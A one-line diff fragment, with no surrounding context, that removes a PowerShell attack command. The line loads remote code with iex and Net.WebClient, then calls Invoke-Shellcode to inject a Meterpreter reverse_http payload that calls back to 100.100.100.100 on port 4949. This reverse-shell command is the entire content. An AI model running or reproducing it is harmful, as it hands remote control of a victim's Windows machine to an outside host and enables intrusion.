@@ -1,1 +1,0 @@
-iex (New-Object Net.WebClient).DownloadString("www.google.com"); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost 100.100.100.100 -Lport 4949 -Force
